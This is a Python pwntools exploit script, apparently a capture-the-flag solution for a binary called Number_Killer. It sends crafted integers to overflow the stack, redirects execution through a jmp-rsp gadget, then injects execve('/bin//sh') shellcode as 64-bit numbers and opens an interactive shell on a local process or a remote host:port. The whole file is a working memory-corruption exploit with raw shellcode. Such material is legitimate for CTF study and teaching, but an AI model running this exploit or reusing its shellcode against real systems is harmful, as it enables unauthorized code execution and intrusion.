#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './Number_Killer'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget

jrsp = 0x0040078A

# elf, libc
#shellcode = asm(shellcraft.sh())
shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05\x00\x00'

buf = 0x7fffffffda90
ret = 0x7fffffffdaf8

# rop1
ru('Let\'s Pwn me with numbers!\n')
for i in range(11):
	sl(str(i))
sl(str(0x0000000b00000000))
sl(str(0xdeadbeef))
sl(str(jrsp))

sh = []
for i in range(len(shellcode)/8):
	sh.append(u64(shellcode[8*i:8*i+8]))

for i in sh:
	print str(i),len(str(i))

for i in sh:
	sl(str(i))

# debug('b *0x0000000000400766')
for i in range(3):
	sl('1')

p.interactive()

